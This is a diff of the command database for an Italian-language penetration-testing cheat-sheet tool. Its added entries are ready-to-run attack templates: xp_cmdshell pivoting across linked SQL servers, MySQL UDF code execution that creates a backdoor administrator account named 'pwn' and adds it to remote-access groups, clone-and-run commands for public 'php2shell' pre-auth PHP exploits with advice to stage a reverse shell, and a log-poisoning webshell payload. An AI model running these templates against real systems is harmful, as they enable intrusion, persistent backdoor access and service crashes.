+        "template": "EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''<cmd>'';') AT [<linked>];",
+        "description": "Se sul linked server sei sysadmin, abiliti ed esegui xp_cmdshell lì via EXECUTE(...) AT, saltando sull'altra istanza. Le virgolette singole vanno raddoppiate dentro la stringa."
       }
     ],
     "note": "# Output atteso\nL'enumerazione elenca i linked server; la query remota rivela con quale login giri sull'altro host, a volte più privilegiato di quello locale.\n# Prossimo passo\nSe sul linked server sei sysadmin, puoi abilitare ed eseguire `xp_cmdshell` lì tramite `EXECUTE('...') AT [server]`, saltando sull'altra istanza."
@@ -7286,7 +7836,7 @@ const COMMANDS = [
     "category": "exploitation",
     "subcategory": "infrastructure",
     "group": "MySQL (3306)",
-    "description": "Prima di tentare la RCE serve verificarne la fattibilità: MySQL non ha un `xp_cmdshell` pronto, quindi occorrono il privilegio `FILE` e un `secure_file_priv` non bloccato.\n- `secure_file_priv` può essere: \n   - `''` (vuoto) consente la scrittura ovunque;\n   -  `/path` la limita a quella directory;\n   - `NULL` la disabilita, e la RCE via file non può essere fatta\n- il privilegio `FILE` deve comparire nei grant\n- `plugin_dir` indica dove va collocata la libreria per la via UDF",
+    "description": "Prima di tentare la RCE serve verificarne la fattibilità: MySQL non ha un `xp_cmdshell` pronto, quindi occorrono il privilegio `FILE` e un `secure_file_priv` non bloccato.\n- `secure_file_priv` può essere: \n   - `''` (vuoto) consente la scrittura ovunque;\n   -  `/path` la limita a quella directory;\n   - `NULL` disabilita le operazioni su file via SQL (OUTFILE/DUMPFILE/LOAD_FILE); la via UDF resta comunque se puoi scrivere la libreria nel `plugin_dir` dal filesystem (vedi nota)\n- il privilegio `FILE` deve comparire nei grant\n- `plugin_dir` indica dove va collocata la libreria per la via UDF",
     "platform": "cross-platform",
     "requires": [
       "password"
@@ -7307,7 +7857,7 @@ const COMMANDS = [
         "id": "default",
         "label": "secure_file_priv + plugin_dir",
         "template": "SELECT @@secure_file_priv, @@plugin_dir, @@version_compile_os;",
-        "description": "Un `secure_file_priv` vuoto consente la scrittura di file ovunque, quindi OUTFILE e UDF sono percorribili; con `NULL` la RCE via file è impossibile. `plugin_dir` indica dove caricare la `.so` per l'UDF."
+        "description": "Un `secure_file_priv` vuoto consente la scrittura di file ovunque, quindi OUTFILE e UDF sono percorribili; con `NULL` le operazioni su file via SQL sono disabilitate (CASO B), ma la UDF resta via CASO A se scrivi la libreria nel `plugin_dir` dal filesystem. `plugin_dir` indica dove caricare la `.so` per l'UDF."
       },
       {
         "id": "grants",
@@ -7328,16 +7878,16 @@ const COMMANDS = [
         "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
       }
     ],
-    "note": "# Output atteso\n`secure_file_priv` vuoto consente la scrittura ovunque (OUTFILE e UDF possibili); un percorso la limita a quella cartella; `NULL` chiude la via dei file. Il privilegio `FILE` deve comparire nei grant.\n# Prossimo passo\nSe i prerequisiti ci sono, passa alla RCE via OUTFILE (webshell) o UDF (vedi MySQL — RCE)."
+    "note": "# Output atteso\n`secure_file_priv` vuoto consente la scrittura ovunque (OUTFILE e UDF possibili); un percorso la limita a quella cartella; `NULL` chiude le operazioni su file via SQL. Il privilegio `FILE` deve comparire nei grant.\n# NULL non è sempre game over\n`secure_file_priv = NULL` disabilita OUTFILE, DUMPFILE e LOAD_FILE: scrivere la libreria via SQL (CASO B) non è praticabile. La UDF resta però possibile se puoi mettere la `.dll`/`.so` nel `plugin_dir` dal filesystem (CASO A): `CREATE FUNCTION` carica dal `plugin_dir` e non dipende da `secure_file_priv`. Controlla i permessi sulla cartella col comando `icacls — permessi file/cartella` (Windows; cerca `(M)`/`(F)` per il tuo utente o per `Authenticated Users`) o con `ls -ld` su Linux.\n# Prossimo passo\nSe i prerequisiti ci sono, passa alla RCE: `MySQL — RCE Linux` (OUTFILE/UDF) o `MySQL — RCE Windows` (sys_exec)."
   },
   {
-    "id": "mysql-oscmd",
-    "name": "MySQL — RCE (OUTFILE / UDF)",
+    "id": "mysql-oscmd-linux",
+    "name": "MySQL — RCE Linux (OUTFILE / UDF)",
     "category": "exploitation",
     "subcategory": "infrastructure",
     "group": "MySQL (3306)",
-    "description": "Esecuzione comandi dal database MySQL. Entrambe le vie richiedono il privilegio `FILE` e un `secure_file_priv` permissivo, come descritto in `MySQL — check RCE`.\n- webshell: scrittura di un `.php` nel webroot con `INTO OUTFILE`, che viene poi eseguito via HTTP\n- UDF: caricamento di `lib_mysqludf_sys.so` nel `plugin_dir` e creazione di `sys_eval` per lanciare comandi come l'utente mysqld",
-    "platform": "cross-platform",
+    "description": "Esecuzione comandi da MySQL su Linux. Entrambe le vie richiedono il privilegio `FILE` e un `secure_file_priv` permissivo (vedi `MySQL — check RCE`).\n- webshell: `INTO OUTFILE` scrive un `.php` nel webroot, poi eseguito via HTTP — gira come utente del web server\n- UDF: si carica `lib_mysqludf_sys.so` nel `plugin_dir` e si crea `sys_eval`, che esegue comandi come l'utente del servizio mysqld e ne ritorna l'output. L'esadecimale serve solo se hai la sola connessione SQL: con una shell che ha già messo la `.so` nel `plugin_dir` si salta al `CREATE FUNCTION`.",
+    "platform": "linux",
     "requires": [
       "password"
     ],
@@ -7356,6 +7906,11 @@ const COMMANDS = [
         "key": "webroot",
         "label": "Webroot",
         "placeholder": "/var/www/html"
+      },
+      {
+        "key": "plugindir",
+        "label": "plugin_dir",
+        "placeholder": "/usr/lib/mysql/plugin"
       },
       {
         "key": "user",
@@ -7390,9 +7945,9 @@ const COMMANDS = [
       },
       {
         "id": "udf",
-        "label": "UDF sys_eval",
-        "template": "CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so'; SELECT sys_eval('id');",
-        "description": "Crea la funzione UDF e lancia comandi: `sys_eval` ritorna l'output. La `.so` deve già stare nel `plugin_dir` (vedi la nota). Su Windows la SONAME è `lib_mysqludf_sys.dll`."
+        "label": "UDF sys_eval (.so)",
+        "template": "# ------------------------------------------------------------\n#  PREP (sulla tua macchina): ottieni lib_mysqludf_sys.so\n# ------------------------------------------------------------\n#  Opzione 1 — da Metasploit:\n#    /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so\n#\n#  Opzione 2 — de-cloak da sqlmap:\npython3 /usr/share/sqlmap/extra/cloak/cloak.py -d \\\n    -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_\n\n# ------------------------------------------------------------\n#  SCENARIO\n# ------------------------------------------------------------\n#  CASO A: la .so è già nel plugin_dir del target\n#          (copiata con una shell)  →  salta al passo 3\n#\n#  CASO B: hai solo la connessione MySQL  →  convertila in hex\n#          e scrivila con DUMPFILE (passi 1-2, scrive come mysqld)\nxxd -p lib_mysqludf_sys.so | tr -d '\\n'\n\n# ============================================================\n#  Dal client MySQL\n# ============================================================\n\n# 1) dove va caricata la .so\nSELECT @@plugin_dir;\n\n# 2) scrivi la .so nel plugin_dir  (CASO B)\nSELECT 0x<hex> INTO DUMPFILE '<plugindir>/lib_mysqludf_sys.so';\n\n# 3) registra sys_eval ed esegui\nCREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';\nSELECT sys_eval('id');",
+        "description": "Carica `lib_mysqludf_sys.so` nel `plugin_dir` e registra `sys_eval`, che ritorna l'output. Il template mostra come ottenere la `.so` e i due casi: CASO A (già nel plugin_dir, via shell) o CASO B (solo SQL: hex + DUMPFILE)."
       },
       {
         "id": "sqlmap",
@@ -7406,8 +7961,85 @@ const COMMANDS = [
         "label": "HackTricks — 3306 Pentesting MySQL",
         "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
       }
+    ]
+  },
+  {
+    "id": "mysql-oscmd-win",
+    "name": "MySQL — RCE Windows (sys_exec)",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "MySQL (3306)",
+    "description": "Esecuzione comandi da MySQL su Windows. Richiede il privilegio `FILE` e un `secure_file_priv` permissivo (vedi `MySQL — check RCE`). La UDF è una `.dll` (`lib_mysqludf_sys_64.dll`) e la funzione è `sys_exec`, che ritorna un int: esecuzione blind, nessun output. Il servizio MySQL è avviato di norma come LocalSystem, quindi i comandi girano come SYSTEM. L'esadecimale serve solo con la sola connessione SQL: se la `.dll` è già nel `plugin_dir` (via shell) si salta al `CREATE FUNCTION`.",
+    "platform": "windows",
+    "requires": [
+      "password"
     ],
-    "note": "# Ottenere lib_mysqludf_sys.so\nNon si genera: è una libreria già pronta. La prendi da Kali in una di queste due forme.\n- Metasploit, pronta all'uso (consigliata): `/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so`\n- sqlmap, da decodificare prima dell'uso. sqlmap la distribuisce in forma «cloaked», cioè offuscata e con un `_` finale nel nome, così da non farsi segnalare dall'antivirus mentre sta sul disco. La riporti in chiaro con il suo strumento `cloak.py` passando `-d` (de-cloak, il contrario del cloak):\n\t- `python3 /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_`\n\t- il risultato è il vero file `.so`, pronto da caricare\n# Caricarla nel plugin_dir\nServe `FILE` e un `secure_file_priv` permissivo. Converti la `.so` in esadecimale (`xxd -p file`, unita su una sola riga) e scrivila come file binario con DUMPFILE:\n`SELECT 0x<hex> INTO DUMPFILE '<plugin_dir>/lib_mysqludf_sys.so';`\npoi registra la funzione:\n`CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';`"
+    "protocols": [
+      "mysql"
+    ],
+    "tags": [
+      "mysql",
+      "rce",
+      "udf",
+      "windows",
+      "sys_exec"
+    ],
+    "template": "# ------------------------------------------------------------\n#  PREP (sulla tua macchina): ottieni lib_mysqludf_sys_64.dll\n# ------------------------------------------------------------\n#  de-cloak da sqlmap (la DLL ha un _ finale):\npython3 /usr/share/sqlmap/extra/cloak/cloak.py -d \\\n    -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_\n\n# ------------------------------------------------------------\n#  SCENARIO\n# ------------------------------------------------------------\n#  CASO A: la .dll è già nel plugin_dir del target\n#          (copiata con una shell)  →  salta al passo 3\n#\n#  CASO B: hai solo la connessione MySQL  →  convertila in hex\n#          e scrivila con DUMPFILE (passi 1-2, scrive come il servizio)\nxxd -p lib_mysqludf_sys_64.dll | tr -d '\\n'\n\n# ============================================================\n#  Dal client MySQL\n# ============================================================\n\n# 1) dove va caricata la DLL\nSELECT @@plugin_dir;\n\n# 2) scrivi la UDF nel plugin_dir  (CASO B)\nSELECT 0x<hex> INTO DUMPFILE '<plugindir>/lib_mysqludf_sys_64.dll';\n\n# 3) registra sys_exec, esegui (blind) e crea un admin locale\n#    sys_exec ritorna il codice di uscita: 0 = comando riuscito\nCREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys_64.dll';\nSELECT sys_exec('net user pwn Pwn123! /add');\nSELECT sys_exec('net localgroup administrators pwn /add');\n\n#    L'appartenenza ai gruppi di accesso remoto NON è automatica quando aggiungi\n#    ad Administrators: aggiungi (o almeno verifica) quello che ti serve.\n#      WinRM / evil-winrm  →  \"Remote Management Users\"\nSELECT sys_exec('net localgroup \"Remote Management Users\" pwn /add');\n#      RDP                 →  \"Remote Desktop Users\"  (nome con spazio → tra \" \")\nSELECT sys_exec('net localgroup \"Remote Desktop Users\" pwn /add');",
+    "params": [
+      {
+        "key": "hex",
+        "label": "Hex",
+        "placeholder": ""
+      },
+      {
+        "key": "plugindir",
+        "label": "plugin_dir",
+        "placeholder": "C:/ProgramData/MySQL/MySQL Server 8.0/plugin"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "root"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      },
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "db",
+        "label": "Database",
+        "placeholder": "app"
+      }
+    ],
+    "variants": [
+      {
+        "id": "udf-win",
+        "label": "UDF sys_exec (.dll)",
+        "template": "# ------------------------------------------------------------\n#  PREP (sulla tua macchina): ottieni lib_mysqludf_sys_64.dll\n# ------------------------------------------------------------\n#  de-cloak da sqlmap (la DLL ha un _ finale):\npython3 /usr/share/sqlmap/extra/cloak/cloak.py -d \\\n    -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_\n\n# ------------------------------------------------------------\n#  SCENARIO\n# ------------------------------------------------------------\n#  CASO A: la .dll è già nel plugin_dir del target\n#          (copiata con una shell)  →  salta al passo 3\n#\n#  CASO B: hai solo la connessione MySQL  →  convertila in hex\n#          e scrivila con DUMPFILE (passi 1-2, scrive come il servizio)\nxxd -p lib_mysqludf_sys_64.dll | tr -d '\\n'\n\n# ============================================================\n#  Dal client MySQL\n# ============================================================\n\n# 1) dove va caricata la DLL\nSELECT @@plugin_dir;\n\n# 2) scrivi la UDF nel plugin_dir  (CASO B)\nSELECT 0x<hex> INTO DUMPFILE '<plugindir>/lib_mysqludf_sys_64.dll';\n\n# 3) registra sys_exec, esegui (blind) e crea un admin locale\n#    sys_exec ritorna il codice di uscita: 0 = comando riuscito\nCREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys_64.dll';\nSELECT sys_exec('net user pwn Pwn123! /add');\nSELECT sys_exec('net localgroup administrators pwn /add');\n\n# ------------------------------------------------------------\n#  Accesso remoto: aggiungi il gruppo richiesto\n#  NOTA: Administrators NON include automaticamente i gruppi remoti\n# ------------------------------------------------------------\n#  WinRM / evil-winrm\nSELECT sys_exec('net localgroup \"Remote Management Users\" pwn /add');\n\n#  RDP\nSELECT sys_exec('net localgroup \"Remote Desktop Users\" pwn /add');",
+        "description": "La UDF è una `.dll` e la funzione è `sys_exec`, che ritorna un int: esecuzione cieca, nessun output (0 = comando riuscito). Poiché il servizio gira spesso come LocalSystem i comandi vanno a SYSTEM: crea un admin locale (`net user` e `net localgroup administrators`). L'appartenenza ai gruppi di accesso remoto non è automatica: per rientrare aggiungi (o verifica) `Remote Management Users` per evil-winrm, oppure `Remote Desktop Users` per l'RDP."
+      },
+      {
+        "id": "sqlmap",
+        "label": "sqlmap (auto)",
+        "template": "sqlmap -d \"mysql://<user>:<password>@<ip>:3306/<db>\" --os-shell",
+        "description": "Automatizza la via UDF e apre una shell OS interattiva. `-d` = connessione diretta al DB."
+      }
+    ],
+    "refs": [
+      {
+        "label": "HackTricks — 3306 Pentesting MySQL",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
+      }
+    ]
   },
   {
     "id": "rtsp-cameradar",
@@ -7563,6 +8195,101 @@ const COMMANDS = [
       }
     ],
     "note": "# Prerequisiti\nRedis raggiungibile senza autenticazione (o con password nota) e un processo che può scrivere su disco. Il salvataggio effettivo del file avviene con `SAVE`.\n# Errori comuni\nLa webshell funziona solo se conosci un path servito da un web server e scrivibile dal processo redis. La chiave SSH funziona se redis gira come quell'utente e la cartella `.ssh` esiste."
+  },
+  {
+    "id": "php2shell",
+    "name": "PHP — php2shell (CVE-2026-109618/109619)",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "PHP (80/443)",
+    "description": "**php2shell** sfrutta due RCE pre-auth nel core di PHP. \n\n**CVE-2026-109618** è una corruzione di memoria dopo un out-of-memory: un `longjmp()` lascia la memoria in uno stato invalido che la fase di shutdown rilegge. \n\n**CVE-2026-109619** è uno use-after-free da stato globale di richiesta che sopravvive alla liberazione della memoria e viene usato prima della re-inizializzazione.\n\nSenza alcuna credenziale, una sequenza di richieste HTTP, porta all'esecuzione di comandi con i privilegi del worker web, di norma `www-data`.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "php",
+      "php2shell",
+      "cve-2026-109618",
+      "cve-2026-109619",
+      "rce",
+      "pre-auth",
+      "uaf"
+    ],
+    "template": "# scarica il PoC (CVE-2026-109618, SAPI Apache mod_php)\ngit clone https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC\ncd php2shell-CVE-2026-109618-CVE-2026-109619-PoC\n\n# esegue il comando sul target (max 14 byte inline) e salva la prova su file\npython3 poc_109618.py -u http://<ip> -c '<cmd>' --proof-file out/p1",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.15"
+      },
+      {
+        "key": "cmd",
+        "label": "Comando (≤ 14 byte)",
+        "placeholder": "id>/out/p1"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "eness — script singolo (109618)",
+        "template": "# scarica il PoC (CVE-2026-109618, SAPI Apache mod_php)\ngit clone https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC\ncd php2shell-CVE-2026-109618-CVE-2026-109619-PoC\n\n# esegue il comando sul target (max 14 byte inline) e salva la prova su file\npython3 poc_109618.py -u http://<ip> -c '<cmd>' --proof-file out/p1",
+        "description": "Lo script più diretto: un solo file, mirato a CVE-2026-109618 su Apache prefork + mod_php. Su una build diversa da Debian 12 (immagine `php:8.4.26-apache`) vanno passati `--zif-offset`/`--dtor-offset`; con `--fetch /p1.txt` recupera via HTTP l'output del comando."
+      },
+      {
+        "id": "devploit",
+        "label": "devploit — Apache + FPM",
+        "template": "# prepara il repo (clona l'exploit upstream in vendor/)\ngit clone https://github.com/devploit/php2shell\ncd php2shell && python3 tools/bootstrap_upstream.py\n\n# dispatcher automatico: rileva versione e SAPI ed esegue (target remoto: aggiungi --allow-remote --arch amd64)\npython3 tools/php2shell_auto.py -u http://<ip> -c '<cmd>'",
+        "description": "Toolkit con matrice di versioni per Apache mod_php e PHP-FPM, costruito attorno all'exploit upstream di 9bie. `--list` elenca i profili, `--allow-remote` abilita i bersagli remoti, `--arch`/`--profile` forniscono gli offset del binario. I profili FPM sono riportati dai contributor: va rifatta la calibrazione per ciascun host."
+      },
+      {
+        "id": "ikow",
+        "label": "ikow — 5 chain (A-E)",
+        "template": "# clona il repo: 5 chain (A-E) alternative, divise per SAPI/precondizione + regole di detection\ngit clone https://github.com/ikow/php2shell-poc\ncd php2shell-poc\n\n# 1) verifica quale via è percorribile (uno script per chain)\npython3 poc/verify_session_injection.py --target http://<ip>   # -> chain A\npython3 poc/verify_handler_mismatch.py --target http://<ip>    # -> chain C (FPM)\npython3 poc/verify_fpm_stale_state.py --target http://<ip>     # -> chain E (FPM)\npython3 poc/verify_oom_trigger.py --host <ip> --port 80        # -> chain D (mod_php)\n\n# 2) esegui UNA sola chain, in base all'esito del verify\n# A  session injection -> LFI (pre-auth; serve un sink LFI nell'app; tutti i SAPI)\npython3 exploit/chain_a_session_lfi.py --host <ip> --port 80 --command '<cmd>'\n# C  handler mismatch -> __destruct (pre-auth; FPM con due dir a serialize_handler diverso)\npython3 exploit/chain_c_mismatch_rce.py --host <ip> --port 80 --command '<cmd>'\n# B  var_destroy UAF -> handler overwrite (NON pre-auth: richiede già unserialize() o una webshell)\nphp exploit/chain_b_uaf_rce.php\n# D, E  OOM/stale state -> RCE (pre-auth, app-independent; nel repo solo i verify, l'exploit è a pagamento)",
+        "description": "Cinque catene alternative (A-E) divise per SAPI/precondizione: nel repo c'è il codice di A, B e C, mentre D ed E hanno solo lo script di verify (l'exploit è riservato agli abbonati). Prima i `verify_*` dicono quale via è aperta, poi se ne lancia UNA. A richiede un sink LFI nell'app; B non è pre-auth (serve già `unserialize()` o una webshell); C ed E sono per FPM; D è mod_php e indipendente dall'app. Include anche regole di detection pronte (Suricata, Sigma, ModSecurity), utili lato difesa."
+      },
+      {
+        "id": "offsec-edb",
+        "label": "OffSec — EDB-52704 (8.5.11)",
+        "template": "# scarica il PoC da Exploit-DB (EDB-52704, autore OffSec) nella cartella corrente\nsearchsploit -m 52704\n\n# esegue il comando sul target (endpoint di default /index.php); con --rce senza valore lancia un id di prova e verifica /proof.txt\npython3 52704.py --host <ip> --rce '<cmd>'",
+        "description": "Il PoC pubblicato da OffSec su Exploit-DB (EDB-52704, 22/10/2026): un unico script Python3 (solo stdlib) validato su PHP 8.5.11 + Apache mod_php prefork, che funziona anche con ASLR attivo ricavando gli indirizzi dal cookie `PHPSESSID` leakato. `searchsploit -m 52704` lo scarica. Comando limitato a ~47 caratteri. Molto build-specific: su un binario diverso da quello validato gli offset vanno ricalibrati a mano (GDB/ROPgadget)."
+      }
+    ],
+    "refs": [
+      {
+        "label": "CVE-2026-109618 — GHSA-w8hw-w9fx-j79w (RCE via OOM corruption)",
+        "url": "https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w"
+      },
+      {
+        "label": "CVE-2026-109619 — GHSA-6wmf-4rv5-p3rp (RCE via stale global state)",
+        "url": "https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp"
+      },
+      {
+        "label": "PoC — eness (CVE-2026-109618, Apache)",
+        "url": "https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC"
+      },
+      {
+        "label": "PoC/toolkit — devploit (Apache + FPM, matrice versioni)",
+        "url": "https://github.com/devploit/php2shell"
+      },
+      {
+        "label": "PoC — ikow (5 chain + regole di detection)",
+        "url": "https://github.com/ikow/php2shell-poc"
+      },
+      {
+        "label": "PoC — OffSec / Exploit-DB (EDB-52704, validato su PHP 8.5.11)",
+        "url": "https://www.exploit-db.com/exploits/52704"
+      },
+      {
+        "label": "Wiz Research — analisi php2shell",
+        "url": "https://www.wiz.io/blog/php2shell-php-rce"
+      }
+    ],
+    "note": "# Versioni vulnerabili\n**Rami supportati**:\n- affetti **< 8.2.35**, **< 8.3.36**, **< 8.4.27**, **< 8.5.12**\n- corrette in `8.2.35`, `8.3.36`, `8.4.27`, `8.5.12` (e `8.6.0 RC4`)\n\n<br>\n**Rami EOL**\n- affetti **5.4.0** (2012) a **8.1.x**\n- corrette per `7.4`, `8.0`, `8.1`\n- nessun fix per `5.4`→`7.3`\n\n<br>La versione del target si legge dagli header `X-Powered-By` o `Server`, quando non rimossi.\n# Prerequisiti\n- Nessuna credenziale: basta raggiungere via HTTP un qualunque endpoint PHP del target\n- SAPI: resa massima su Apache mod_php (prefork); su PHP-FPM è dimostrata la via del session upload progress\n- `session.upload_progress.enabled` è On di default ed è il trigger indipendente dall'app per la via CVE-2026-109619\n- Target remoti: servono gli offset del binario (ASLR); i PoC pubblici sono tarati su build e configurazioni di laboratorio precise (spesso un solo worker, `memory_limit` basso)\n# Limitazioni\n- Comando inline limitato a **14 byte** sui target remoti: per comandi più lunghi o una reverse shell si scrive uno stager su file e lo si concatena\n- Offset per-build: su target remoti diversi dalla build di laboratorio vanno forniti a mano (`--zif-offset`/`--dtor-offset` in eness, `--arch`/`--profile` in devploit)\n- La riuscita dipende da SAPI, numero di worker, `memory_limit` e `display_errors`: \"nessuna prova non significa assenza di esecuzione\"\n- eness e il PoC OffSec (EDB-52704) sono PoC per CVE-2026-109618; per CVE-2026-109619 il percorso dimostrato è il session upload progress, coperto da ikow e devploit\n# Dall'RCE alla shell\nL'esecuzione è one-shot e corta. Per una shell stabile: scrivi uno stager sul webroot con un primo comando, poi richiamalo via HTTP (`--fetch` in eness), oppure usa lo stager per scaricare ed eseguire una reverse shell verso un listener.\n# Attenzione\nTecnica distruttiva e rumorosa: l'exploit forza ripetuti out-of-memory che fanno crashare i worker PHP (su Apache uccide i processi figli) e riempie i log di errori 500/OOM. Nessuno stealth. Solo su sistemi in scope e autorizzati."
   },
   {
     "id": "psql-rce",
@@ -7914,6 +8641,68 @@ const COMMANDS = [
     "note": "# Prerequisiti\nServe una lista di username già validati e il domain controller raggiungibile come KDC (porta 88).\n# Output atteso\nUn `[+] VALID LOGIN: utente@dominio:password` segna la coppia valida.\n# Prossimo passo\nCon la credenziale passa all'enumerazione AD autenticata (BloodHound, share); valuta AS-REP roasting e Kerberoast."
   },
   {
+    "id": "cewl",
+    "name": "cewl — wordlist dal sito",
+    "category": "exploitation",
+    "subcategory": "cred-attacks",
+    "group": "Wordlist",
+    "description": "Estrae parole dal sito web del target per costruire una wordlist mirata (password probabili legate all'azienda). Poi si muta con le regole di hashcat o si usa in spraying/brute.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "cewl",
+      "wordlist",
+      "cracking"
+    ],
+    "template": "cewl -d <depth> -m <min> -w wordlist.txt http://<ip>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "depth",
+        "label": "Profondità",
+        "placeholder": "2",
+        "default": "2"
+      },
+      {
+        "key": "min",
+        "label": "Lunghezza min",
+        "placeholder": "5",
+        "default": "5"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Crawl sito",
+        "template": "cewl -d <depth> -m <min> -w wordlist.txt http://<ip>",
+        "description": "Raccoglie le parole del sito in wordlist.txt."
+      },
+      {
+        "id": "rich",
+        "label": "Con numeri + email",
+        "template": "cewl -d <depth> -m <min> --with-numbers -e -w wordlist.txt http://<ip>",
+        "description": "`--with-numbers` tiene le parole con cifre, `-e` raccoglie anche le email."
+      },
+      {
+        "id": "mutate",
+        "label": "Muta (hashcat rules)",
+        "template": "hashcat wordlist.txt -r /usr/share/hashcat/rules/best64.rule --stdout > mutated.txt",
+        "description": "Applica le regole di mutazione: genera varianti (maiuscole, cifre, simboli)."
+      }
+    ],
+    "note": "# Uso\nWordlist su misura del target. Combina con `username-anarchy` per gli username e con spraying/brute. Mutala con le regole hashcat (`best64`, `rockyou-30000`) per coprire le varianti comuni."
+  },
+  {
     "id": "hash-identify",
     "name": "Identifica il tipo di hash",
     "category": "exploitation",
@@ -8012,7 +8801,7 @@ const COMMANDS = [
       "mask",
       "cracking"
     ],
-    "template": "# dizionario piu regole (punto di partenza)\nhashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
+    "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
     "params": [
       {
         "key": "mode",
@@ -8131,7 +8920,7 @@ const COMMANDS = [
         "description": "PDF protetto da password."
       }
     ],
-    "note": "# Come funziona\nLo script `*2john` converte il file protetto in un hash che john o hashcat sanno craccare. Lo script giusto dipende dal tipo di file (`ssh2john`, `zip2john`, `keepass2john`, `office2john`, `pdf2john`); `locate *2john*` li elenca tutti.\n# Prossimo passo\nLa passphrase o password craccata sblocca la chiave SSH, l'archivio o il database: usala per l'accesso o per estrarre altri segreti."
+    "note": "# Come funziona\nLo script `*2john` converte il file protetto in un hash che john o hashcat sanno craccare. Lo script giusto dipende dal tipo di file:\n- `ssh2john`\n- `zip2john`\n- `keepass2john`\n- `office2john`\n- `pdf2john`\n`locate *2john*` li elenca tutti.\n# Prossimo passo\nLa passphrase o password craccata sblocca la chiave SSH, l'archivio o il database: usala per l'accesso o per estrarre altri segreti."
   },
   {
     "id": "client-macro",
@@ -8752,7 +9541,7 @@ const COMMANDS = [
       "log-poisoning",
       "rce"
     ],
-    "template": "# avvelena il log del web server scrivendo il payload nello User-Agent\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/\n\n# include il log via LFI: il PHP dentro viene eseguito\nhttp://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id",
+    "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
     "variants": [
       {
         "id": "default",
@@ -8913,7 +9702,7 @@ const COMMANDS = [
         "url": "https://book.hacktricks.wiki/en/pentesting-web/command-injection.html"
       }
     ],
-    "note": "# Output atteso\nL'output del comando iniettato compare nella risposta. Se non c'è output (blind), conferma con un ritardo (`; sleep 5`) o con un callback OOB (DNS/HTTP verso il tuo host).\n# Opzioni utili\nSeparatori: `;`, `|`, `&&`, backtick, `$(...)`. Contro i filtri: `${IFS}` al posto degli spazi, quote interne (`w'h'oami`), concatenazione o encoding.\n# Prossimo passo\nConfermata la RCE con `id` o `whoami`, lancia una reverse shell e stabilizza."
+    "note": "# Output atteso\nL'output del comando iniettato compare nella risposta. Se non c'è output (blind), conferma con un ritardo (`; sleep 5`) o con un callback OOB (DNS/HTTP verso il tuo host).\n# Opzioni utili\nSeparatori:\n- `;`\n- `|`\n- `&&`\n- backtick\n- `$(...)`\nContro i filtri:\n- `${IFS}` al posto degli spazi\n- quote interne (`w'h'oami`)\n- concatenazione o encoding\n# Prossimo passo\nConfermata la RCE con `id` o `whoami`, lancia una reverse shell e stabilizza."
   },
   {
     "id": "ssti-detect",
@@ -8934,7 +9723,7 @@ const COMMANDS = [
       "template-injection",
       "web"
     ],
-    "template": "curl -gs 'http://<ip>/?<param>=${{<%[%27%22}}%25\\'",
+    "template": "# incolla nel campo riflesso; se qualcosa va in errore o valuta, c'è SSTI\n${{<%[%'\"}}%\\",
     "params": [
       {
         "key": "ip",
@@ -8974,7 +9763,7 @@ const COMMANDS = [
         "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
       }
     ],
-    "note": "# Output atteso\nSe `{{7*7}}` (o `${7*7}`) torna `49`, il template valuta l'input: è vulnerabile. Se resta letterale, no. Il motore si distingue incrociando i marcatori: `{{ }}` Jinja2/Twig, `${ }` FreeMarker, `#{ }` Ruby/Thymeleaf, `<%= %>` ERB.\n# Prossimo passo\nIdentificato il motore, passa al payload di RCE specifico (vedi SSTI — RCE per engine)."
